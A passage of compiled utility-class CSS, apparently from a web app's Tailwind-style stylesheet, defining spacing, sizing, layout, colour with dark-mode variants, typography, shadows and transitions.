                    margin-left: calc(var(--spacing)*1)
                }

                .ml-2 {
                    margin-left: calc(var(--spacing)*2)
                }

                .block {
                    display: block
                }

                .contents {
                    display: contents
                }

                .flex {
                    display: flex
                }

                .grid {
                    display: grid
                }

                .hidden {
                    display: none
                }

                .inline {
                    display: inline
                }

                .inline-block {
                    display: inline-block
                }

                .inline-flex {
                    display: inline-flex
                }

                .size-1\.5 {
                    width: calc(var(--spacing)*1.5);
                    height: calc(var(--spacing)*1.5)
                }

                .size-2 {
                    width: calc(var(--spacing)*2);
                    height: calc(var(--spacing)*2)
                }

                .size-4 {
                    width: calc(var(--spacing)*4);
                    height: calc(var(--spacing)*4)
                }

                .size-5 {
                    width: calc(var(--spacing)*5);
                    height: calc(var(--spacing)*5)
                }

                .size-6 {
                    width: calc(var(--spacing)*6);
                    height: calc(var(--spacing)*6)
                }

                .size-8 {
                    width: calc(var(--spacing)*8);
                    height: calc(var(--spacing)*8)
                }

                .size-10 {
                    width: calc(var(--spacing)*10);
                    height: calc(var(--spacing)*10)
                }

                .size-12 {
                    width: calc(var(--spacing)*12);
                    height: calc(var(--spacing)*12)
                }

                .size-\[26px\] {
                    width: 26px;
                    height: 26px
                }

                .size-\[36px\] {
                    width: 36px;
                    height: 36px
                }

                .size-\[180px\] {
                    width: 180px;
                    height: 180px
                }

                .h-2 {
                    height: calc(var(--spacing)*2)
                }

                .h-2\.25 {
                    height: calc(var(--spacing)*2.25)
                }

                .h-2\/3 {
                    height: 66.66667%
                }

                .h-3 {
                    height: calc(var(--spacing)*3)
                }

                .h-3\/5 {
                    height: 60%
                }

                .h-4 {
                    height: calc(var(--spacing)*4)
                }

                .h-5 {
                    height: calc(var(--spacing)*5)
                }

                .h-6 {
                    height: calc(var(--spacing)*6)
                }

                .h-6\.5 {
                    height: calc(var(--spacing)*6.5)
                }

                .h-7 {
                    height: calc(var(--spacing)*7)
                }

                .h-8 {
                    height: calc(var(--spacing)*8)
                }

                .h-10 {
                    height: calc(var(--spacing)*10)
                }

                .h-11 {
                    height: calc(var(--spacing)*11)
                }

                .h-12 {
                    height: calc(var(--spacing)*12)
                }

                .h-20 {
                    height: calc(var(--spacing)*20)
                }

                .h-28 {
                    height: calc(var(--spacing)*28)
                }

                .h-\[26px\] {
                    height: 26px
                }

                .h-\[40px\] {
                    height: 40px
                }

                .h-\[80\%\] {
                    height: 80%
                }

                .h-\[140px\] {
                    height: 140px
                }

                .h-\[214px\] {
                    height: 214px
                }

                .h-auto {
                    height: auto
                }

                .h-full {
                    height: 100%
                }

                .max-h-75 {
                    max-height: calc(var(--spacing)*75)
                }

                .max-h-\[90\%\] {
                    max-height: 90%
                }

                .min-h-0 {
                    min-height: calc(var(--spacing)*0)
                }

                .min-h-\[36px\] {
                    min-height: 36px
                }

                .min-h-\[48px\] {
                    min-height: 48px
                }

                .min-h-\[230px\] {
                    min-height: 230px
                }

                .min-h-full {
                    min-height: 100%
                }

                .w-2 {
                    width: calc(var(--spacing)*2)
                }

                .w-2\/3 {
                    width: 66.66667%
                }

                .w-3 {
                    width: calc(var(--spacing)*3)
                }

                .w-3\/5 {
                    width: 60%
                }

                .w-4 {
                    width: calc(var(--spacing)*4)
                }

                .w-5 {
                    width: calc(var(--spacing)*5)
                }

                .w-6 {
                    width: calc(var(--spacing)*6)
                }

                .w-6\.5 {
                    width: calc(var(--spacing)*6.5)
                }

                .w-8 {
                    width: calc(var(--spacing)*8)
                }

                .w-10 {
                    width: calc(var(--spacing)*10)
                }

                .w-12 {
                    width: calc(var(--spacing)*12)
                }

                .w-20 {
                    width: calc(var(--spacing)*20)
                }

                .w-47\.25 {
                    width: calc(var(--spacing)*47.25)
                }

                .w-72 {
                    width: calc(var(--spacing)*72)
                }

                .w-89 {
                    width: calc(var(--spacing)*89)
                }

                .w-\[14\.5px\] {
                    width: 14.5px
                }

                .w-\[41px\] {
                    width: 41px
                }

                .w-\[80\%\] {
                    width: 80%
                }

                .w-\[140px\] {
                    width: 140px
                }

                .w-\[198px\] {
                    width: 198px
                }

                .w-auto {
                    width: auto
                }

                .w-fit {
                    width: fit-content
                }

                .w-full {
                    width: 100%
                }

                .max-w-200 {
                    max-width: calc(var(--spacing)*200)
                }

                .max-w-\[320px\] {
                    max-width: 320px
                }

                .max-w-full {
                    max-width: 100%
                }

                .min-w-0 {
                    min-width: calc(var(--spacing)*0)
                }

                .min-w-30 {
                    min-width: calc(var(--spacing)*30)
                }

                .min-w-37\.5 {
                    min-width: calc(var(--spacing)*37.5)
                }

                .flex-1 {
                    flex: 1
                }

                .flex-none {
                    flex: none
                }

                .shrink-0 {
                    flex-shrink: 0
                }

                .grow {
                    flex-grow: 1
                }

                .translate-x-0 {
                    --tw-translate-x: calc(var(--spacing)*0)
                }

                .translate-x-0,
                .translate-x-5 {
                    translate: var(--tw-translate-x) var(--tw-translate-y)
                }

                .translate-x-5 {
                    --tw-translate-x: calc(var(--spacing)*5)
                }

                .-rotate-90 {
                    rotate: -90deg
                }

                .rotate-90 {
                    rotate: 90deg
                }

                .rotate-180 {
                    rotate: 180deg
                }

                .transform {
                    transform: var(--tw-rotate-x, ) var(--tw-rotate-y, ) var(--tw-rotate-z, ) var(--tw-skew-x, ) var(--tw-skew-y, )
                }

                .animate-border {
                    animation: animateBorder 8s linear infinite
                }

                .animate-connectingDash {
                    animation: dash 1.5s ease-in-out infinite
                }

                .animate-connectingRotate {
                    animation: rotate 1.5s linear infinite
                }

                .animate-map-pin-pulse-connected {
                    animation: map-pin-pulse-connected 3s ease-out infinite
                }

                .animate-map-pin-pulse-connecting {
                    animation: map-pin-pulse-connecting 1.5s ease-out infinite
                }

                .animate-spin {
                    animation: spin 1s linear infinite;
                    animation: var(--animate-spin)
                }

                .fade-in-0 {
                    animation: fadeIn .15s ease-out
                }

                .cursor-not-allowed {
                    cursor: not-allowed
                }

                .cursor-not-allowed\! {
                    cursor: not-allowed !important
                }

                .cursor-pointer {
                    cursor: pointer
                }

                .resize-none\! {
                    resize: none !important
                }

                .scroll-p-1 {
                    scroll-padding: calc(var(--spacing)*1)
                }

                .list-none {
                    list-style-type: none
                }

                .flex-col {
                    flex-direction: column
                }

                .flex-row {
                    flex-direction: row
                }

                .flex-row-reverse {
                    flex-direction: row-reverse
                }

                .flex-wrap {
                    flex-wrap: wrap
                }

                .items-center {
                    align-items: center
                }

                .items-start {
                    align-items: flex-start
                }

                .justify-between {
                    justify-content: space-between
                }

                .justify-center {
                    justify-content: center
                }

                .justify-end {
                    justify-content: flex-end
                }

                .gap-0 {
                    gap: calc(var(--spacing)*0)
                }

                .gap-0\.5 {
                    gap: calc(var(--spacing)*.5)
                }

                .gap-1 {
                    gap: calc(var(--spacing)*1)
                }

                .gap-2 {
                    gap: calc(var(--spacing)*2)
                }

                .gap-3 {
                    gap: calc(var(--spacing)*3)
                }

                .gap-4 {
                    gap: calc(var(--spacing)*4)
                }

                .gap-5 {
                    gap: calc(var(--spacing)*5)
                }

                .gap-6 {
                    gap: calc(var(--spacing)*6)
                }

                .gap-7 {
                    gap: calc(var(--spacing)*7)
                }

                .gap-8 {
                    gap: calc(var(--spacing)*8)
                }

                .self-center {
                    align-self: center
                }

                .self-end {
                    align-self: flex-end
                }

                .self-start {
                    align-self: flex-start
                }

                .truncate {
                    overflow: hidden;
                    text-overflow: ellipsis;
                    white-space: nowrap
                }

                .overflow-auto {
                    overflow: auto
                }

                .overflow-hidden {
                    overflow: hidden
                }

                .overflow-y-auto {
                    overflow-y: auto
                }

                .border-radius-full {
                    border-radius: var(--borderRadius-full)
                }

                .border-radius-md {
                    border-radius: var(--borderRadius-md)
                }

                .border-radius-sm {
                    border-radius: var(--borderRadius-sm)
                }

                .rounded-\[4px\] {
                    border-radius: 4px
                }

                .rounded-\[12px\] {
                    border-radius: 12px
                }

                .rounded-full {
                    border-radius: var(--borderRadius-full)
                }

                .rounded-lg {
                    border-radius: var(--borderRadius-lg)
                }

                .rounded-md {
                    border-radius: var(--borderRadius-md)
                }

                .rounded-none {
                    border-radius: var(--borderRadius-none)
                }

                .rounded-sm {
                    border-radius: var(--borderRadius-sm)
                }

                .rounded-xs {
                    border-radius: var(--borderRadius-xs)
                }

                .border {
                    border-style: var(--tw-border-style);
                    border-width: 1px
                }

                .border-2 {
                    border-style: var(--tw-border-style);
                    border-width: 2px
                }

                .border-md {
                    border-style: var(--tw-border-style);
                    border-width: var(--borderWidth-md)
                }

                .border-none {
                    border-style: var(--tw-border-style);
                    border-width: var(--borderWidth-none)
                }

                .border-width-md {
                    border-width: var(--borderWidth-md)
                }

                .border-x-0 {
                    border-inline-style: var(--tw-border-style);
                    border-inline-width: 0
                }

                .border-t {
                    border-top-style: var(--tw-border-style);
                    border-top-width: 1px
                }

                .border-t-\[0\.5px\] {
                    border-top-style: var(--tw-border-style);
                    border-top-width: .5px
                }

                .border-b-0 {
                    border-bottom-style: var(--tw-border-style);
                    border-bottom-width: 0
                }

                .border-none {
                    --tw-border-style: none;
                    border-style: none
                }

                .border-accent {
                    border-color: var(--color-blue-600);

                    .dark & {
                        border-color: var(--color-blue-600)
                    }
                }

                .border-critical {
                    border-color: var(--color-red-400);

                    .dark & {
                        border-color: var(--color-red-600)
                    }
                }

                .border-critical\! {
                    border-color: var(--color-red-400) !important;

                    .dark & {
                        border-color: var(--color-red-600) !important
                    }
                }

                .border-input {
                    border-color: var(--color-neutral-500);

                    .dark & {
                        border-color: var(--color-neutral-600)
                    }
                }

                .border-primary {
                    border-color: var(--color-neutral-300);

                    .dark & {
                        border-color: var(--color-neutral-700)
                    }
                }

                .border-secondary {
                    border-color: var(--color-neutral-200);

                    .dark & {
                        border-color: var(--color-neutral-800)
                    }
                }

                .border-success {
                    border-color: var(--color-green-400);

                    .dark & {
                        border-color: var(--color-green-600)
                    }
                }

                .border-warning {
                    border-color: var(--color-yellow-300);

                    .dark & {
                        border-color: var(--color-yellow-600)
                    }
                }

                .border-transparent {
                    border-color: transparent
                }

                .bg-accent {
                    background-color: var(--color-blue-600);

                    .dark & {
                        background-color: var(--color-blue-600)
                    }
                }

                .bg-accent-subtle {
                    background-color: var(--color-blue-100);

                    .dark & {
                        background-color: var(--color-blue-950)
                    }
                }

                .bg-critical {
                    background-color: var(--color-red-600);

                    .dark & {
                        background-color: var(--color-red-700)
                    }
                }

                .bg-critical-subtle {
                    background-color: var(--color-red-100);

                    .dark & {
                        background-color: var(--color-red-950)
                    }
                }

                .bg-disabled {
                    background-color: var(--color-neutral-300);

                    .dark & {
                        background-color: var(--color-neutral-800)
                    }
                }

                .bg-glass {
                    background-color: #f7f7f8b3;

                    .dark & {
                        background-color: #141415b3
                    }
                }

                .bg-primary {
                    background-color: var(--color-neutral-100);

                    .dark & {
                        background-color: var(--color-neutral-1000)
                    }
                }

                .bg-secondary {
                    background-color: var(--color-neutral-0);

                    .dark & {
                        background-color: var(--color-neutral-950)
                    }
                }

                .bg-success {
                    background-color: var(--color-green-600);

                    .dark & {
                        background-color: var(--color-green-600)
                    }
                }

                .bg-success-subtle {
                    background-color: var(--color-green-100);

                    .dark & {
                        background-color: var(--color-green-950)
                    }
                }

                .bg-tertiary {
                    background-color: var(--color-neutral-150);

                    .dark & {
                        background-color: var(--color-neutral-900)
                    }
                }

                .bg-warning {
                    background-color: var(--color-yellow-300);

                    .dark & {
                        background-color: var(--color-yellow-600)
                    }
                }

                .bg-warning-subtle {
                    background-color: var(--color-yellow-100);

                    .dark & {
                        background-color: var(--color-yellow-950)
                    }
                }

                .bg-current {
                    background-color: currentcolor
                }

                .bg-green-500 {
                    background-color: var(--color-green-500)
                }

                .bg-neutral-0 {
                    background-color: var(--color-neutral-0)
                }

                .bg-neutral-500 {
                    background-color: var(--color-neutral-500)
                }

                .bg-neutral-1000\/50 {
                    background-color: var(--color-neutral-1000);

                    @supports (color:color-mix(in lab, red, red)) {
                        background-color: color-mix(in oklab, var(--color-neutral-1000) 50%, transparent)
                    }
                }

                .bg-red-700 {
                    background-color: var(--color-red-700)
                }

                .bg-transparent {
                    background-color: transparent
                }

                .bg-linear-to-b {
                    --tw-gradient-position: to bottom;

                    @supports (background-image:linear-gradient(in lab, red, red)) {
                        --tw-gradient-position: to bottom in oklab
                    }

                    background-image:linear-gradient(var(--tw-gradient-stops))
                }

                .bg-gradient-to-b {
                    --tw-gradient-position: to bottom in oklab;
                    background-image: linear-gradient(var(--tw-gradient-stops))
                }

                .bg-\(image\:--ai-gradient\) {
                    background-image: var(--ai-gradient)
                }

                .from-neutral-100 {
                    --tw-gradient-from: var(--color-neutral-100);
                    --tw-gradient-stops: var(--tw-gradient-via-stops, var(--tw-gradient-position), var(--tw-gradient-from) var(--tw-gradient-from-position), var(--tw-gradient-to) var(--tw-gradient-to-position))
                }

                .to-neutral-150 {
                    --tw-gradient-to: var(--color-neutral-150);
                    --tw-gradient-stops: var(--tw-gradient-via-stops, var(--tw-gradient-position), var(--tw-gradient-from) var(--tw-gradient-from-position), var(--tw-gradient-to) var(--tw-gradient-to-position))
                }

                .to-transparent {
                    --tw-gradient-to: transparent;
                    --tw-gradient-stops: var(--tw-gradient-via-stops, var(--tw-gradient-position), var(--tw-gradient-from) var(--tw-gradient-from-position), var(--tw-gradient-to) var(--tw-gradient-to-position))
                }

                .bg-size-\[400\%_400\%\] {
                    background-size: 400% 400%
                }

                .fill-current {
                    fill: currentcolor
                }

                .fill-neutral-0 {
                    fill: var(--color-neutral-0)
                }

                .stroke-primary {
                    stroke: var(--color-neutral-300);

                    .dark & {
                        stroke: var(--color-neutral-700)
                    }
                }

                .stroke-blue-600 {
                    stroke: var(--color-blue-600)
                }

                .stroke-green-700 {
                    stroke: var(--color-green-700)
                }

                .stroke-neutral-300 {
                    stroke: var(--color-neutral-300)
                }

                .p-0 {
                    padding: calc(var(--spacing)*0)
                }

                .p-0\.5 {
                    padding: calc(var(--spacing)*.5)
                }

                .p-1 {
                    padding: calc(var(--spacing)*1)
                }

                .p-1\.5 {
                    padding: calc(var(--spacing)*1.5)
                }

                .p-2 {
                    padding: calc(var(--spacing)*2)
                }

                .p-4 {
                    padding: calc(var(--spacing)*4)
                }

                .p-6 {
                    padding: calc(var(--spacing)*6)
                }

                .p-\[5px\] {
                    padding: 5px
                }

                .px-1 {
                    padding-inline: calc(var(--spacing)*1)
                }

                .px-2 {
                    padding-inline: calc(var(--spacing)*2)
                }

                .px-2\.5 {
                    padding-inline: calc(var(--spacing)*2.5)
                }

                .px-3 {
                    padding-inline: calc(var(--spacing)*3)
                }

                .px-4 {
                    padding-inline: calc(var(--spacing)*4)
                }

                .px-5 {
                    padding-inline: calc(var(--spacing)*5)
                }

                .px-6 {
                    padding-inline: calc(var(--spacing)*6)
                }

                .px-7 {
                    padding-inline: calc(var(--spacing)*7)
                }

                .py-0\.5 {
                    padding-block: calc(var(--spacing)*.5)
                }

                .py-1 {
                    padding-block: calc(var(--spacing)*1)
                }

                .py-1\.5 {
                    padding-block: calc(var(--spacing)*1.5)
                }

                .py-2 {
                    padding-block: calc(var(--spacing)*2)
                }

                .py-2\.5 {
                    padding-block: calc(var(--spacing)*2.5)
                }

                .py-3 {
                    padding-block: calc(var(--spacing)*3)
                }

                .py-4 {
                    padding-block: calc(var(--spacing)*4)
                }

                .pt-0\.5 {
                    padding-top: calc(var(--spacing)*.5)
                }

                .pt-1 {
                    padding-top: calc(var(--spacing)*1)
                }

                .pt-2 {
                    padding-top: calc(var(--spacing)*2)
                }

                .pt-4 {
                    padding-top: calc(var(--spacing)*4)
                }

                .pr-2 {
                    padding-right: calc(var(--spacing)*2)
                }

                .pr-3 {
                    padding-right: calc(var(--spacing)*3)
                }

                .pr-4 {
                    padding-right: calc(var(--spacing)*4)
                }

                .pr-5 {
                    padding-right: calc(var(--spacing)*5)
                }

                .pr-8 {
                    padding-right: calc(var(--spacing)*8)
                }

                .pr-10 {
                    padding-right: calc(var(--spacing)*10)
                }

                .pb-1 {
                    padding-bottom: calc(var(--spacing)*1)
                }

                .pb-3 {
                    padding-bottom: calc(var(--spacing)*3)
                }

                .pb-6 {
                    padding-bottom: calc(var(--spacing)*6)
                }

                .pl-1 {
                    padding-left: calc(var(--spacing)*1)
                }

                .pl-4 {
                    padding-left: calc(var(--spacing)*4)
                }

                .pl-5 {
                    padding-left: calc(var(--spacing)*5)
                }

                .pl-10 {
                    padding-left: calc(var(--spacing)*10)
                }

                .pl-16 {
                    padding-left: calc(var(--spacing)*16)
                }

                .text-center {
                    text-align: center
                }

                .text-end {
                    text-align: end
                }

                .text-justify {
                    text-align: justify
                }

                .text-left {
                    text-align: left
                }

                .text-right {
                    text-align: right
                }

                .text-start {
                    text-align: start
                }

                .body {
                    font-family: var(--font-body);
                    font-weight: var(--fontWeight-normal);
                    font-size: var(--fontSize-md);
                    letter-spacing: var(--letterSpacing-md);
                    line-height: 22px
                }

                .body-2xs {
                    font-weight: var(--fontWeight-normal)
                }

                .body-2xs,
                .body-2xs-bold {
                    font-family: var(--font-body);
                    font-size: var(--fontSize-2xs);
                    letter-spacing: var(--letterSpacing-md);
                    line-height: 18px
                }

                .body-2xs-bold {
                    font-weight: var(--fontWeight-bold)
                }

                .body-2xs-medium {
                    font-family: var(--font-body);
                    font-weight: var(--fontWeight-medium);
                    font-size: var(--fontSize-2xs);
                    letter-spacing: var(--letterSpacing-md);
                    line-height: 18px
                }

                .body-lg {
                    font-weight: var(--fontWeight-normal)
                }

                .body-lg,
                .body-lg-bold {
                    font-family: var(--font-body);
                    font-size: var(--fontSize-lg);
                    letter-spacing: var(--letterSpacing-md);
                    line-height: 24px
                }

                .body-lg-bold {
                    font-weight: var(--fontWeight-bold)
                }

                .body-lg-medium {
                    font-family: var(--font-body);
                    font-weight: var(--fontWeight-medium);
                    font-size: var(--fontSize-lg);
                    letter-spacing: var(--letterSpacing-md);
                    line-height: 24px
                }

                .body-md {
                    font-weight: var(--fontWeight-normal)
                }

                .body-md,
                .body-md-bold {
                    font-family: var(--font-body);
                    font-size: var(--fontSize-md);
                    letter-spacing: var(--letterSpacing-md);
                    line-height: 22px
                }

                .body-md-bold {
                    font-weight: var(--fontWeight-bold)
                }

                .body-md-medium {
                    font-family: var(--font-body);
                    font-weight: var(--fontWeight-medium);
                    font-size: var(--fontSize-md);
                    letter-spacing: var(--letterSpacing-md);
                    line-height: 22px
                }

                .body-sm {
                    font-weight: var(--fontWeight-normal)
                }

                .body-sm,
                .body-sm-bold {
                    font-family: var(--font-body);
                    font-size: var(--fontSize-sm);
                    letter-spacing: var(--letterSpacing-md);
                    line-height: 20px
                }

                .body-sm-bold {
                    font-weight: var(--fontWeight-bold)
                }

                .body-sm-medium {
                    font-family: var(--font-body);
                    font-weight: var(--fontWeight-medium);
                    font-size: var(--fontSize-sm);
                    letter-spacing: var(--letterSpacing-md);
                    line-height: 20px
                }

                .body-xs {
                    font-weight: var(--fontWeight-normal)
                }

                .body-xs,
                .body-xs-bold {
                    font-family: var(--font-body);
                    font-size: var(--fontSize-xs);
                    letter-spacing: var(--letterSpacing-md);
                    line-height: 18px
                }

                .body-xs-bold {
                    font-weight: var(--fontWeight-bold)
                }

                .body-xs-medium {
                    font-weight: var(--fontWeight-medium)
                }

                .body-xs-medium,
                .caption {
                    font-family: var(--font-body);
                    font-size: var(--fontSize-xs);
                    letter-spacing: var(--letterSpacing-md);
                    line-height: 18px
                }

                .caption {
                    font-weight: var(--fontWeight-normal)
                }

                .caption-medium {
                    font-family: var(--font-body);
                    font-weight: var(--fontWeight-medium);
                    font-size: var(--fontSize-xs);
                    letter-spacing: var(--letterSpacing-md);
                    line-height: 18px
                }

                .display {
                    font-size: var(--fontSize-5xl);
                    letter-spacing: var(--letterSpacing-sm);
                    line-height: 36px
                }

                .display,
                .heading {
                    font-family: var(--font-heading);
                    font-weight: var(--fontWeight-bold)
                }

                .heading {
                    font-size: var(--fontSize-3xl);
                    letter-spacing: var(--letterSpacing-md);
                    line-height: 32px
                }

                .heading-2xl {
                    font-size: var(--fontSize-7xl);
                    line-height: 48px
                }

                .heading-2xl,
                .heading-lg {
                    font-family: var(--font-heading);
                    font-weight: var(--fontWeight-bold);
                    letter-spacing: var(--letterSpacing-sm)
                }

                .heading-lg {
                    font-size: var(--fontSize-5xl);
                    line-height: 36px
                }

                .heading-md {
                    font-size: var(--fontSize-4xl);
                    line-height: 34px
                }

                .heading-md,
                .heading-sm {
                    font-family: var(--font-heading);
                    font-weight: var(--fontWeight-bold);
                    letter-spacing: var(--letterSpacing-md)
                }

                .heading-sm {
                    font-size: var(--fontSize-2xl);
                    line-height: 30px
                }

                .heading-xl {
                    font-family: var(--font-heading);
                    font-weight: var(--fontWeight-bold);
                    font-size: var(--fontSize-6xl);
                    letter-spacing: var(--letterSpacing-sm);
                    line-height: 40px
                }

                .subBody {
                    font-weight: var(--fontWeight-normal);
                    font-size: var(--fontSize-sm);
                    line-height: 20px
                }

                .subBody,
                .subHeading {
                    font-family: var(--font-body);
                    letter-spacing: var(--letterSpacing-md)
                }

                .subHeading {
                    font-weight: var(--fontWeight-medium);
                    font-size: var(--fontSize-md);
                    line-height: 22px
                }

                .leading-normal {
                    --tw-leading: var(--leading-normal);
                    line-height: var(--leading-normal)
                }

                .break-words {
                    overflow-wrap: break-word
                }

                .whitespace-normal {
                    white-space: normal
                }

                .whitespace-nowrap {
                    white-space: nowrap
                }

                .text-accent {
                    color: var(--color-blue-600);

                    .dark & {
                        color: var(--color-blue-500)
                    }
                }

                .text-accent-active {
                    color: var(--color-blue-700);

                    .dark & {
                        color: var(--color-blue-400)
                    }
                }

                .text-critical {
                    color: var(--color-red-700);

                    .dark & {
                        color: var(--color-red-400)
                    }
                }

                .text-disabled {
                    color: var(--color-neutral-400);

                    .dark & {
                        color: var(--color-neutral-700)
                    }
                }

                .text-placeholder {
                    color: var(--color-neutral-600);

                    .dark & {
                        color: var(--color-neutral-400)
                    }
                }

                .text-primary {
                    color: var(--color-neutral-900);

                    .dark & {
                        color: var(--color-neutral-0)
                    }
                }

                .text-primary-on-color {
                    color: var(--color-neutral-0);

                    .dark & {
                        color: var(--color-neutral-0)
                    }
                }

                .text-secondary {
                    color: var(--color-neutral-600);

                    .dark & {
                        color: var(--color-neutral-500)
                    }
                }

                .text-secondary-on-color {
                    color: var(--color-neutral-100);

                    .dark & {
                        color: var(--color-neutral-100)
                    }
                }

                .text-success {
                    color: var(--color-green-700);

                    .dark & {
                        color: var(--color-green-400)
                    }
                }

                .text-warning {
                    color: var(--color-yellow-700);

                    .dark & {
                        color: var(--color-yellow-300)
                    }
                }

                .capitalize {
                    text-transform: capitalize
                }

                .lowercase {
                    text-transform: lowercase
                }

                .uppercase {
                    text-transform: uppercase
                }

                .underline {
                    text-decoration-line: underline
                }

                .underline-offset-2 {
                    text-underline-offset: 2px
                }

                .opacity-0 {
                    opacity: 0
                }

                .opacity-100 {
                    opacity: 1
                }

                .shadow-\(--shadow-ai-glow\) {
                    --tw-shadow: var(--shadow-ai-glow);
                    box-shadow: var(--tw-inset-shadow), var(--tw-inset-ring-shadow), var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow)
                }

                .shadow-\[0_2px_3px_0_rgba\(0\,0\,0\,0\.20\)\,inset_0_0\.75px_0\.75px_0_rgba\(255\,255\,255\,0\.30\)\] {
                    --tw-shadow: 0 2px 3px 0 var(--tw-shadow-color, rgba(0, 0, 0, .2)), inset 0 .75px .75px 0 var(--tw-shadow-color, hsla(0, 0%, 100%, .3))
                }

                .shadow-\[0_2px_3px_0_rgba\(0\,0\,0\,0\.20\)\,inset_0_0\.75px_0\.75px_0_rgba\(255\,255\,255\,0\.30\)\],
                .shadow-focus {
                    box-shadow: var(--tw-inset-shadow), var(--tw-inset-ring-shadow), var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow)
                }

                .shadow-focus {
                    --tw-shadow: 0px 0px 0px 2px var(--tw-shadow-color, var(--color-neutral-0)), 0px 0px 0px 4px var(--tw-shadow-color, var(--color-blue-600))
                }

                .shadow-lg {
                    --tw-shadow: 0 4px 8px 0 var(--tw-shadow-color, rgba(0, 0, 0, .16))
                }

                .shadow-lg,
                .shadow-none {
                    box-shadow: var(--tw-inset-shadow), var(--tw-inset-ring-shadow), var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow)
                }

                .shadow-none {
                    --tw-shadow: 0 0#0000
                }

                .focus-ring {
                    --tw-outline-style: none;
                    outline-style: none;

                    &:focus-visible {
                        --tw-ring-shadow: var(--tw-ring-inset, )0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color, currentcolor);
                        box-shadow: var(--tw-inset-shadow), var(--tw-inset-ring-shadow), var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow)
                    }

                    &:focus-visible {
                        --tw-ring-color: var(--color-blue-600)
                    }

                    &:focus-visible {
                        --tw-ring-offset-width: 2px;
                        --tw-ring-offset-shadow: var(--tw-ring-inset, )0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color)
                    }

                    &[data-headlessui-state]:focus-visible:not([data-focus]) {
                        --tw-ring-shadow: var(--tw-ring-inset, )0 0 0 calc(var(--tw-ring-offset-width)) var(--tw-ring-color, currentcolor);
                        box-shadow: var(--tw-inset-shadow), var(--tw-inset-ring-shadow), var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow)
                    }
                }

                .ring {
                    --tw-ring-shadow: var(--tw-ring-inset, )0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color, currentcolor);
                    box-shadow: var(--tw-inset-shadow), var(--tw-inset-ring-shadow), var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow)
                }

                .shadow-bevel {
                    box-shadow: 0 2px 8px #0000000a, inset 0 .5px #fff0;

                    .dark & {
                        box-shadow: 0 2px 8px #0000, inset 0 .5px #ffffff29
                    }
                }

                .outline-hidden {
                    --tw-outline-style: none;
                    outline-style: none;

                    @media (forced-colors:active) {
                        outline: 2px solid transparent;
                        outline-offset: 2px
                    }
                }

                .outline {
                    outline-style: var(--tw-outline-style);
                    outline-width: 1px
                }

                .blur {
                    --tw-blur: blur(8px)
                }

                .blur,
                .filter {
                    filter: var(--tw-blur, ) var(--tw-brightness, ) var(--tw-contrast, ) var(--tw-grayscale, ) var(--tw-hue-rotate, ) var(--tw-invert, ) var(--tw-saturate, ) var(--tw-sepia, ) var(--tw-drop-shadow, )
                }

                .backdrop-blur-md {
                    --tw-backdrop-blur: blur(16px)
                }

                .backdrop-blur-md,
                .backdrop-blur-sm {
                    -webkit-backdrop-filter: var(--tw-backdrop-blur, ) var(--tw-backdrop-brightness, ) var(--tw-backdrop-contrast, ) var(--tw-backdrop-grayscale, ) var(--tw-backdrop-hue-rotate, ) var(--tw-backdrop-invert, ) var(--tw-backdrop-opacity, ) var(--tw-backdrop-saturate, ) var(--tw-backdrop-sepia, );
                    backdrop-filter: var(--tw-backdrop-blur, ) var(--tw-backdrop-brightness, ) var(--tw-backdrop-contrast, ) var(--tw-backdrop-grayscale, ) var(--tw-backdrop-hue-rotate, ) var(--tw-backdrop-invert, ) var(--tw-backdrop-opacity, ) var(--tw-backdrop-saturate, ) var(--tw-backdrop-sepia, )
                }

                .backdrop-blur-sm {
                    --tw-backdrop-blur: blur(8px)
                }

                .transition {
                    transition-property: color, background-color, border-color, outline-color, text-decoration-color, fill, stroke, --tw-gradient-from, --tw-gradient-via, --tw-gradient-to, opacity, box-shadow, transform, translate, scale, rotate, filter, -webkit-backdrop-filter, backdrop-filter, display, content-visibility, overlay, pointer-events;
                    transition-timing-function: var(--tw-ease, var(--default-transition-timing-function));
                    transition-duration: var(--tw-duration, var(--default-transition-duration))
                }

                .transition-\[stroke\] {
                    transition-property: stroke;
                    transition-timing-function: var(--tw-ease, var(--default-transition-timing-function));
                    transition-duration: var(--tw-duration, var(--default-transition-duration))
                }

                .transition-all {
                    transition-property: all;
                    transition-timing-function: var(--tw-ease, var(--default-transition-timing-function));
                    transition-duration: var(--tw-duration, var(--default-transition-duration))
                }

                .transition-colors {
                    transition-property: color, background-color, border-color, outline-color, text-decoration-color, fill, stroke, --tw-gradient-from, --tw-gradient-via, --tw-gradient-to;
                    transition-timing-function: var(--tw-ease, var(--default-transition-timing-function));
                    transition-duration: var(--tw-duration, var(--default-transition-duration))
                }

                .transition-fast {
                    transition-property: all;
                    transition-timing-function: var(--ease-out);
                    transition-duration: var(--duration-fast)
                }

                .transition-opacity {
                    transition-property: opacity;
                    transition-timing-function: var(--tw-ease, var(--default-transition-timing-function));
                    transition-duration: var(--tw-duration, var(--default-transition-duration))
                }

                .transition-transform {
                    transition-property: transform, translate, scale, rotate;
                    transition-timing-function: var(--tw-ease, var(--default-transition-timing-function));
                    transition-duration: var(--tw-duration, var(--default-transition-duration))
                }

                .duration-150 {
                    --tw-duration: .15s;
                    transition-duration: .15s
                }

                .duration-200 {
                    --tw-duration: .2s;
                    transition-duration: .2s
                }

                .duration-300 {
                    --tw-duration: .3s;
                    transition-duration: .3s
                }

                .duration-500 {
                    --tw-duration: .5s;
                    transition-duration: .5s
                }

                .ease-in {
                    --tw-ease: cubic-bezier(.4, 0, 1, 1);
                    transition-timing-function: cubic-bezier(.4, 0, 1, 1)
                }

                .ease-in-out {
                    --tw-ease: cubic-bezier(.4, 0, .2, 1);
                    transition-timing-function: cubic-bezier(.4, 0, .2, 1)
                }

                .ease-linear {
                    --tw-ease: linear;
                    transition-timing-function: linear
                }

                .outline-none {
                    --tw-outline-style: none;
                    outline-style: none
                }

                .select-none {
                    -webkit-user-select: none;
                    user-select: none
                }

                .bg-glass-gradient {
                    background: linear-gradient(74deg, #fff0, #ffffff3d)
                }

